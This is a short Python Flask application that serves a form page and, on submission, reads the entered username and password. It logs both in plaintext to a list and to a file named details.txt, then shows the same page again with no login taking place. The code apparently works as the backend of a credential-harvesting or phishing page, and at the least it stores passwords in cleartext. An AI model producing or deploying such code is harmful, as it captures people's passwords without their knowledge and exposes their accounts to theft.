from flask import Flask, render_template,request

app = Flask(__name__)

# Create an empty list to store the details
user_details = []

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/', methods=['POST'])
def getvalue():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Append the username and password to the list
        user_details.append(f'Username: {username}, Password: {password}')
        
        # Write the details to the text file
        with open('details.txt', 'a') as file:
            file.write(f'Username: {username}, Password: {password}\n')
        
        return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=False,host='0.0.0.0')
